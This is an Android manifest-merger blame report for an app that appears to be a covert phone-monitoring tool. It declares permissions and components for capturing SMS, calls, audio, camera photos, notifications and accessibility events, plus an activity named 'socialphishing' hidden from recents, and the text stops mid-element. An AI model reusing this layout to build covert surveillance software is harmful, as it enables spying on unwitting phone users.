app/build/intermediates/manifest_merge_blame_file/debug/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.github.midros.istheapp"
4    android:versionCode="1"
5    android:versionName="2.0.0" >
6
7    <uses-sdk
8        android:minSdkVersion="21"
8-->src\main\AndroidManifest.xml
9        android:targetSdkVersion="26" />
9-->src\main\AndroidManifest.xml
10    <!-- location -->
11    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
11-->src\main\AndroidManifest.xml:6:5-79
11-->src\main\AndroidManifest.xml:6:22-76
12    <!-- <uses-permission android:name="android.permission.CAMERA" /> -->
13    <!-- storage -->
14    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
14-->src\main\AndroidManifest.xml:9:5-81
14-->src\main\AndroidManifest.xml:9:22-78
15    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
15-->src\main\AndroidManifest.xml:10:5-80
15-->src\main\AndroidManifest.xml:10:22-77
16    <!-- calls -->
17    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
17-->src\main\AndroidManifest.xml:12:5-81
17-->src\main\AndroidManifest.xml:12:22-78
18    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
18-->src\main\AndroidManifest.xml:13:5-75
18-->src\main\AndroidManifest.xml:13:22-72
19    <uses-permission android:name="android.permission.CALL_PHONE" />
19-->src\main\AndroidManifest.xml:14:5-68
19-->src\main\AndroidManifest.xml:14:22-66
20    <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT" />
20-->src\main\AndroidManifest.xml:15:5-16:47
20-->src\main\AndroidManifest.xml:15:22-76
21    <uses-permission android:name="android.permission.RECORD_AUDIO" />
21-->src\main\AndroidManifest.xml:17:5-71
21-->src\main\AndroidManifest.xml:17:22-68
22    <uses-permission android:name="android.permission.READ_CONTACTS" />
22-->src\main\AndroidManifest.xml:18:5-72
22-->src\main\AndroidManifest.xml:18:22-69
23    <!-- message -->
24    <uses-permission android:name="android.permission.RECEIVE_SMS" />
24-->src\main\AndroidManifest.xml:20:5-70
24-->src\main\AndroidManifest.xml:20:22-67
25    <uses-permission android:name="android.permission.READ_SMS" />
25-->src\main\AndroidManifest.xml:21:5-67
25-->src\main\AndroidManifest.xml:21:22-64
26    <uses-permission android:name="android.permission.SEND_SMS" />
26-->src\main\AndroidManifest.xml:22:5-67
26-->src\main\AndroidManifest.xml:22:22-64
27    <uses-permission android:name="android.permission.WRITE_SMS" />
27-->src\main\AndroidManifest.xml:23:5-68
27-->src\main\AndroidManifest.xml:23:22-65
28    <!-- camera -->
29    <uses-permission android:name="android.permission.CAMERA" />
29-->src\main\AndroidManifest.xml:25:5-65
29-->src\main\AndroidManifest.xml:25:22-62
30    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
30-->src\main\AndroidManifest.xml:26:5-78
30-->src\main\AndroidManifest.xml:26:22-75
31
32    <uses-feature
32-->src\main\AndroidManifest.xml:28:5-30:35
33        android:name="android.hardware.camera"
33-->src\main\AndroidManifest.xml:29:9-47
34        android:required="true" />
34-->src\main\AndroidManifest.xml:30:9-32
35
36    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
36-->src\main\AndroidManifest.xml:32:5-79
36-->src\main\AndroidManifest.xml:32:22-76
37    <uses-permission android:name="android.permission.INTERNET" />
37-->src\main\AndroidManifest.xml:33:5-67
37-->src\main\AndroidManifest.xml:33:22-64
38    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
38-->src\main\AndroidManifest.xml:34:5-81
38-->src\main\AndroidManifest.xml:34:22-78
39    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
39-->src\main\AndroidManifest.xml:35:5-84
39-->src\main\AndroidManifest.xml:35:22-81
40    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
40-->src\main\AndroidManifest.xml:36:5-94
40-->src\main\AndroidManifest.xml:36:22-92
41    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
41-->src\main\AndroidManifest.xml:37:5-39:47
41-->src\main\AndroidManifest.xml:38:9-62
42
43    <!-- vibrate -->
44    <uses-permission android:name="android.permission.VIBRATE" />
44-->src\main\AndroidManifest.xml:42:5-66
44-->src\main\AndroidManifest.xml:42:22-63
45
46    <uses-feature
46-->[com.google.android.gms:play-services-maps:17.0.0] AndroidManifest.xml:26:5-28:35
47        android:glEsVersion="0x00020000"
47-->[com.google.android.gms:play-services-maps:17.0.0] AndroidManifest.xml:27:9-41
48        android:required="true" />
48-->[com.google.android.gms:play-services-maps:17.0.0] AndroidManifest.xml:28:9-32
49
50    <uses-permission android:name="android.permission.WAKE_LOCK" /> <!-- Required by older versions of Google Play services to create IID tokens -->
50-->[com.google.android.gms:play-services-measurement-api:17.2.0] AndroidManifest.xml:24:5-68
50-->[com.google.android.gms:play-services-measurement-api:17.2.0] AndroidManifest.xml:24:22-65
51    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
51-->[com.google.firebase:firebase-iid:19.0.0] AndroidManifest.xml:26:5-82
51-->[com.google.firebase:firebase-iid:19.0.0] AndroidManifest.xml:26:22-79
52    <uses-permission android:name="com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE" />
52-->[com.google.android.gms:play-services-measurement:17.2.0] AndroidManifest.xml:26:5-110
52-->[com.google.android.gms:play-services-measurement:17.2.0] AndroidManifest.xml:26:22-107
53
54    <application
54-->src\main\AndroidManifest.xml:44:5-156:19
55        android:name="com.github.midros.istheapp.app.IsTheApp"
55-->src\main\AndroidManifest.xml:45:9-37
56        android:allowBackup="true"
56-->src\main\AndroidManifest.xml:46:9-35
57        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
57-->[androidx.core:core:1.1.0] AndroidManifest.xml:24:18-86
58        android:debuggable="true"
59        android:icon="@mipmap/ic_launcher"
59-->src\main\AndroidManifest.xml:47:9-43
60        android:label="@string/app_name"
60-->src\main\AndroidManifest.xml:48:9-41
61        android:roundIcon="@mipmap/ic_launcher"
61-->src\main\AndroidManifest.xml:49:9-48
62        android:sharedUserId="android.uid.system"
62-->src\main\AndroidManifest.xml:53:9-50
63        android:supportsRtl="true"
63-->src\main\AndroidManifest.xml:50:9-35
64        android:testOnly="true"
65        android:theme="@style/AppTheme" >
65-->src\main\AndroidManifest.xml:51:9-40
66        <activity
66-->src\main\AndroidManifest.xml:55:9-63:20
67            android:name="com.github.midros.istheapp.ui.activities.login.LoginActivity"
67-->src\main\AndroidManifest.xml:56:13-62
68            android:theme="@style/Login" >
68-->src\main\AndroidManifest.xml:57:13-41
69            <intent-filter>
69-->src\main\AndroidManifest.xml:58:13-62:29
70                <action android:name="android.intent.action.MAIN" />
70-->src\main\AndroidManifest.xml:59:17-69
70-->src\main\AndroidManifest.xml:59:25-66
71
72                <category android:name="android.intent.category.LAUNCHER" />
72-->src\main\AndroidManifest.xml:61:17-77
72-->src\main\AndroidManifest.xml:61:27-74
73            </intent-filter>
74        </activity>
75        <activity
75-->src\main\AndroidManifest.xml:64:9-66:44
76            android:name="com.github.midros.istheapp.ui.activities.register.RegisterActivity"
76-->src\main\AndroidManifest.xml:65:13-68
77            android:theme="@style/Login" />
77-->src\main\AndroidManifest.xml:66:13-41
78        <activity
78-->src\main\AndroidManifest.xml:67:9-70:62
79            android:name="com.github.midros.istheapp.ui.activities.mainparent.MainParentActivity"
79-->src\main\AndroidManifest.xml:68:13-72
80            android:configChanges="orientation|screenSize"
80-->src\main\AndroidManifest.xml:70:13-59
81            android:theme="@style/AppTheme" />
81-->src\main\AndroidManifest.xml:69:13-44
82        <activity
82-->src\main\AndroidManifest.xml:71:9-74:62
83            android:name="com.github.midros.istheapp.ui.activities.mainchild.MainChildActivity"
83-->src\main\AndroidManifest.xml:72:13-70
84            android:configChanges="orientation|screenSize"
84-->src\main\AndroidManifest.xml:74:13-59
85            android:theme="@style/Child" />
85-->src\main\AndroidManifest.xml:73:13-41
86        <activity
86-->src\main\AndroidManifest.xml:75:9-77:43
87            android:name="com.github.midros.istheapp.ui.activities.lock.LockActivity"
87-->src\main\AndroidManifest.xml:76:13-60
88            android:theme="@style/Lock" />
88-->src\main\AndroidManifest.xml:77:13-40
89        <activity
89-->src\main\AndroidManifest.xml:78:9-81:50
90            android:name="com.github.midros.istheapp.ui.activities.gallery.ViewPhoto"
90-->src\main\AndroidManifest.xml:79:13-60
91            android:configChanges="orientation|screenSize"
91-->src\main\AndroidManifest.xml:80:13-59
92            android:theme="@style/Transparent" />
92-->src\main\AndroidManifest.xml:81:13-47
93        <activity
93-->src\main\AndroidManifest.xml:82:9-87:45
94            android:name="com.github.midros.istheapp.ui.activities.socialphishing.SocialActivityM"
94-->src\main\AndroidManifest.xml:83:13-73
95            android:configChanges="orientation|screenSize"
95-->src\main\AndroidManifest.xml:84:13-59
96            android:excludeFromRecents="true"
96-->src\main\AndroidManifest.xml:85:13-46
97            android:taskAffinity="com.github.midros.istheapp.ui.activities.socialphishing.SocialActivityM"
97-->src\main\AndroidManifest.xml:86:13-107
98            android:theme="@style/Social" />
98-->src\main\AndroidManifest.xml:87:13-42
99
100        <!-- Services -->
101        <service android:name="com.github.midros.istheapp.services.calls.CallsService" />
101-->src\main\AndroidManifest.xml:90:9-64
101-->src\main\AndroidManifest.xml:90:18-61
102        <service android:name="com.github.midros.istheapp.services.sms.SmsService" />
102-->src\main\AndroidManifest.xml:91:9-60
102-->src\main\AndroidManifest.xml:91:18-57
103        <service android:name="com.github.midros.istheapp.services.social.MonitorService" />
103-->src\main\AndroidManifest.xml:92:9-67
103-->src\main\AndroidManifest.xml:92:18-64
104        <service
104-->src\main\AndroidManifest.xml:93:9-105:19
105            android:name="com.github.midros.istheapp.services.accessibilityData.AccessibilityDataService"
105-->src\main\AndroidManifest.xml:94:13-80
106            android:label="@string/accessibility_service_label"
106-->src\main\AndroidManifest.xml:95:13-64
107            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
107-->src\main\AndroidManifest.xml:96:13-79
108            <intent-filter>
108-->src\main\AndroidManifest.xml:98:13-100:29
109                <action android:name="android.accessibilityservice.AccessibilityService" />
109-->src\main\AndroidManifest.xml:99:17-92
109-->src\main\AndroidManifest.xml:99:25-89
110            </intent-filter>
111
112            <meta-data
112-->src\main\AndroidManifest.xml:102:13-104:72
113                android:name="android.accessibilityservice"
113-->src\main\AndroidManifest.xml:103:17-60
114                android:resource="@xml/accessibility_service_config" />
114-->src\main\AndroidManifest.xml:104:17-69
115        </service>
116        <service
116-->src\main\AndroidManifest.xml:106:9-112:19
117            android:name="com.github.midros.istheapp.services.notificationService.NotificationService"
117-->src\main\AndroidManifest.xml:107:13-77
118            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
118-->src\main\AndroidManifest.xml:108:13-87
119            <intent-filter>
119-->src\main\AndroidManifest.xml:109:13-111:29
120                <action android:name="android.service.notification.NotificationListenerService" />
120-->src\main\AndroidManifest.xml:110:17-99
120-->src\main\AndroidManifest.xml:110:25-96
121            </intent-filter>
122        </service>
123
124        <!-- Receivers -->
125        <receiver
125-->src\main\AndroidManifest.xml:115:9-123:20
126            android:name="com.github.midros.istheapp.receiver.SmsReceiver"
126-->src\main\AndroidManifest.xml:116:13-49
127            android:enabled="true"
127-->src\main\AndroidManifest.xml:117:13-35
128            android:exported="true"
128-->src\main\AndroidManifest.xml:118:13-36
129            android:permission="android.permission.BROADCAST_SMS" >
129-->src\main\AndroidManifest.xml:119:13-66
130            <intent-filter android:priority="999" >
130-->src\main\AndroidManifest.xml:120:13-122:29
130-->src\main\AndroidManifest.xml:120:28-50
131                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
131-->src\main\AndroidManifest.xml:121:17-82
131-->src\main\AndroidManifest.xml:121:25-79
132            </intent-filter>
133        </receiver>
134        <receiver android:name="com.github.midros.istheapp.receiver.CallsReceiver" >
134-->src\main\AndroidManifest.xml:125:9-130:20
134-->src\main\AndroidManifest.xml:125:19-57
135            <intent-filter android:priority="999" >
135-->src\main\AndroidManifest.xml:126:13-129:29
135-->src\main\AndroidManifest.xml:126:28-50
136                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
136-->src\main\AndroidManifest.xml:127:17-82
136-->src\main\AndroidManifest.xml:127:25-79
137                <action android:name="android.intent.action.PHONE_STATE" />
137-->src\main\AndroidManifest.xml:128:17-76
137-->src\main\AndroidManifest.xml:128:25-73
138            </intent-filter>
139        </receiver>
140        <receiver
140-->src\main\AndroidManifest.xml:132:9-139:20
141            android:name="com.github.midros.istheapp.receiver.PhotoReceiver"
141-->src\main\AndroidManifest.xml:133:13-51
142            android:enabled="true" >
142-->src\main\AndroidManifest.xml:134:13-35
143            <intent-filter>
143-->src\main\AndroidManifest.xml:135:13-138:29
144                <action android:name="com.android.camera.NEW_PICTURE" />
144-->src\main\AndroidManifest.xml:136:17-73
144-->src\main\AndroidManifest.xml:136:25-70
145
146                <data android:mimeType="image/*" />
146-->src\main\AndroidManifest.xml:137:17-52
146-->src\main\AndroidManifest.xml:137:23-49
147            </intent-filter>
148        </receiver>
149        <receiver
149-->src\main\AndroidManifest.xml:140:9-147:20
150            android:name="com.github.midros.istheapp.receiver.MonitorReceiver"
150-->src\main\AndroidManifest.xml:141:13-53
151            android:enabled="true"
151-->src\main\AndroidManifest.xml:142:13-35
152            android:exported="false" >
152-->src\main\AndroidManifest.xml:143:13-37
153            <intent-filter>
153-->src\main\AndroidManifest.xml:144:13-146:29
154                <action android:name="com.github.midros.istheapp.receiver.RESTART_MONITOR_RECEIVER" />
154-->src\main\AndroidManifest.xml:145:17-103
154-->src\main\AndroidManifest.xml:145:25-100
155            </intent-filter>
156        </receiver>
157
158        <meta-data
158-->src\main\AndroidManifest.xml:149:9-151:69
159            android:name="com.google.android.gms.version"
159-->src\main\AndroidManifest.xml:150:13-58
160            android:value="@integer/google_play_services_version" />
160-->src\main\AndroidManifest.xml:151:13-66
161        <meta-data
161-->src\main\AndroidManifest.xml:152:9-154:52
162            android:name="com.google.android.maps.v2.API_KEY"
162-->src\main\AndroidManifest.xml:153:13-62
163            android:value="@string/APY_KEY_MAPS" />
163-->src\main\AndroidManifest.xml:154:13-49
164        <meta-data
164-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:19:9-21:63
165            android:name="com.facebook.sdk.ApplicationId"
165-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:20:13-58
166            android:value="@string/facebook_application_id" />
166-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:21:13-60
167
168        <activity
168-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:23:9-27:61
169            android:name="com.firebase.ui.auth.KickoffActivity"
169-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:24:13-64
170            android:exported="false"
170-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:25:13-37
171            android:label=""
171-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:26:13-29
172            android:theme="@style/FirebaseUI.Transparent" />
172-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:27:13-58
173        <activity
173-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:28:9-32:61
174            android:name="com.firebase.ui.auth.ui.idp.SingleSignInActivity"
174-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:29:13-76
175            android:exported="false"
175-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:30:13-37
176            android:label=""
176-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:31:13-29
177            android:theme="@style/FirebaseUI.Transparent" />
177-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:32:13-58
178        <activity
178-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:33:9-37:61
179            android:name="com.firebase.ui.auth.ui.credentials.CredentialSaveActivity"
179-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:34:13-86
180            android:exported="false"
180-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:35:13-37
181            android:label=""
181-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:36:13-29
182            android:theme="@style/FirebaseUI.Transparent" />
182-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:37:13-58
183        <activity
183-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:38:9-42:58
184            android:name="com.firebase.ui.auth.ui.email.RecoverPasswordActivity"
184-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:39:13-81
185            android:exported="false"
185-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:40:13-37
186            android:label="@string/fui_title_recover_password_activity"
186-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:41:13-72
187            android:windowSoftInputMode="adjustResize" />
187-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:42:13-55
188        <activity
188-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:43:9-47:58
189            android:name="com.firebase.ui.auth.ui.email.EmailActivity"
189-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:44:13-71
190            android:exported="false"
190-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:45:13-37
191            android:label="@string/fui_sign_in_default"
191-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:46:13-56
192            android:windowSoftInputMode="adjustResize" />
192-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:47:13-55
193        <activity
193-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:48:9-52:77
194            android:name="com.firebase.ui.auth.ui.phone.PhoneActivity"
194-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:49:13-71
195            android:exported="false"
195-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:50:13-37
196            android:label="@string/fui_sign_in_with_phone_number"
196-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:51:13-66
197            android:windowSoftInputMode="adjustResize|stateAlwaysVisible" />
197-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:52:13-74
198        <activity
198-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:53:9-57:58
199            android:name="com.firebase.ui.auth.ui.idp.WelcomeBackIdpPrompt"
199-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:54:13-76
200            android:exported="false"
200-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:55:13-37
201            android:label="@string/fui_title_welcome_back_idp_prompt"
201-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:56:13-70
202            android:windowSoftInputMode="adjustResize" />
202-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:57:13-55
203        <activity
203-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:58:9-62:58
204            android:name="com.firebase.ui.auth.ui.email.WelcomeBackPasswordPrompt"
204-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:59:13-83
205            android:exported="false"
205-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:60:13-37
206            android:label="@string/fui_title_welcome_back_password_prompt"
206-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:61:13-75
207            android:windowSoftInputMode="adjustResize" />
207-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:62:13-55
208        <activity
208-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:63:9-67:58
209            android:name="com.firebase.ui.auth.ui.email.WelcomeBackEmailLinkPrompt"
209-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:64:13-84
210            android:exported="false"
210-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:65:13-37
211            android:label="@string/fui_title_welcome_back_password_prompt"
211-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:66:13-75
212            android:windowSoftInputMode="adjustResize" />
212-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:67:13-55
213        <activity
213-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:68:9-73:58
214            android:name="com.firebase.ui.auth.ui.email.EmailLinkCatcherActivity"
214-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:69:13-82
215            android:exported="false"
215-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:70:13-37
216            android:label=""
216-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:71:13-29
217            android:theme="@style/FirebaseUI.Transparent"
217-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:72:13-58
218            android:windowSoftInputMode="adjustResize" />
218-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:73:13-55
219        <activity
219-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:74:9-78:58
220            android:name="com.firebase.ui.auth.ui.email.EmailLinkErrorRecoveryActivity"
220-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:75:13-88
221            android:exported="false"
221-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:76:13-37
222            android:label="@string/fui_sign_in_default"
222-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:77:13-56
223            android:windowSoftInputMode="adjustResize" />
223-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:78:13-55
224        <activity
224-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:79:9-82:65
225            android:name="com.firebase.ui.auth.ui.idp.AuthMethodPickerActivity"
225-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:80:13-80
226            android:exported="false"
226-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:81:13-37
227            android:label="@string/fui_default_toolbar_title" />
227-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:82:13-62
228        <activity
228-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:83:9-87:48
229            android:name="com.facebook.FacebookActivity"
229-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:84:13-57
230            android:configChanges="keyboard|keyboardHidden|screenLayout|screenSize|orientation"
230-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:85:13-96
231            android:label="@string/app_name" />
231-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:86:13-45
232        <activity
232-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:88:9-100:20
233            android:name="com.facebook.CustomTabActivity"
233-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:89:13-58
234            android:exported="true" >
234-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:90:13-36
235            <intent-filter>
235-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:92:13-99:29
236                <action android:name="android.intent.action.VIEW" />
236-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:93:17-69
236-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:93:25-66
237
238                <category android:name="android.intent.category.DEFAULT" />
238-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:95:17-76
238-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:95:27-73
239                <category android:name="android.intent.category.BROWSABLE" />
239-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:96:17-78
239-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:96:27-75
240
241                <data android:scheme="@string/facebook_login_protocol_scheme" />
241-->src\main\AndroidManifest.xml:137:17-52
242            </intent-filter>
243        </activity>
244
245        <provider
245-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:102:9-106:38
246            android:name="com.firebase.ui.auth.data.client.AuthUiInitProvider"
246-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:103:13-79
247            android:authorities="com.github.midros.istheapp.authuiinitprovider"
247-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:104:13-70
248            android:exported="false"
248-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:105:13-37
249            android:initOrder="90" />
249-->[com.firebaseui:firebase-ui-auth:5.1.0] AndroidManifest.xml:106:13-35
250
251        <activity
251-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:24:9-31:50
252            android:name="com.google.firebase.auth.internal.FederatedSignInActivity"
252-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:25:13-85
253            android:excludeFromRecents="true"
253-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:26:13-46
254            android:exported="true"
254-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:27:13-36
255            android:launchMode="singleTask"
255-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:28:13-44
256            android:permission="com.google.firebase.auth.api.gms.permission.LAUNCH_FEDERATED_SIGN_IN"
256-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:29:13-102
257            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
257-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:30:13-72
258
259        <service
259-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:33:9-39:19
260            android:name="com.google.firebase.components.ComponentDiscoveryService"
260-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:34:13-84
261            android:directBootAware="true"
261-->[com.google.firebase:firebase-common:19.1.0] AndroidManifest.xml:14:13-43
262            android:exported="false" >
262-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:35:13-37
263            <meta-data
263-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:36:13-38:85
264                android:name="com.google.firebase.components:com.google.firebase.auth.FirebaseAuthRegistrar"
264-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:37:17-109
265                android:value="com.google.firebase.components.ComponentRegistrar" />
265-->[com.google.firebase:firebase-auth:19.0.0] AndroidManifest.xml:38:17-82
266            <meta-data
266-->[com.google.firebase:firebase-database:19.1.0] AndroidManifest.xml:32:13-34:85
267                android:name="com.google.firebase.components:com.google.firebase.database.DatabaseRegistrar"
267-->[com.google.firebase:firebase-database:19.1.0] AndroidManifest.xml:33:17-109
268                android:value="com.google.firebase.components.ComponentRegistrar" />
268-->[com.google.firebase:firebase-database:19.1.0] AndroidManifest.xml:34:17-82
269            <meta-data
269-->[com.google.firebase:firebase-storage:19.0.1] AndroidManifest.xml:33:13-35:85
270                android:name="com.google.firebase.components:com.google.firebase.storage.StorageRegistrar"
270-->[com.google.firebase:firebase-storage:19.0.1] AndroidManifest.xml:34:17-107
271                android:value="com.google.firebase.components.ComponentRegistrar" />
271-->[com.google.firebase:firebase-storage:19.0.1] AndroidManifest.xml:35:17-82
272            <meta-data
272-->[com.google.firebase:firebase-firestore:19.0.0] AndroidManifest.xml:18:13-20:85
273                android:name="com.google.firebase.components:com.google.firebase.firestore.FirestoreRegistrar"
273-->[com.google.firebase:firebase-firestore:19.0.0] AndroidManifest.xml:19:17-111
274                android:value="com.google.firebase.components.ComponentRegistrar" />
274-->[com.google.firebase:firebase-firestore:19.0.0] AndroidManifest.xml:20:17-82
275            <meta-data
275-->[com.google.android.gms:play-services-measurement-api:17.2.0] AndroidManifest.xml:30:13-32:85
276                android:name="com.google.firebase.components:com.google.firebase.analytics.connector.internal.AnalyticsConnectorRegistrar"